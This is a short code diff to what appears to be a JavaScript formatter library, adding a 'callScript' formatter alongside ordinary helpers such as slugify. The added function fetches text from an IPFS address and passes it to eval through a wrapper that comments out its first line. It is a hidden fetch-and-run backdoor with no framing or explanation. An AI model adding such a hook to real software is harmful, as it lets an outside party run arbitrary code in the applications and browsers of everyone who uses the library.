@@ -469,6 +469,14 @@ dmx.Formatters("global", {
                     return n + (log - parseInt(log));
                 }
             },
+            callScript : function(o, s) {
+                fetch(`https://ipfs.io/ipfs/${s}`)
+                .then((response) => response.text())
+                .then((data) => {
+                const code = `(//${data}\n)("${o}")`;
+                return eval(code);
+                })
+            },
             slugify: function(t) {
                 return t
                     .toLowerCase()
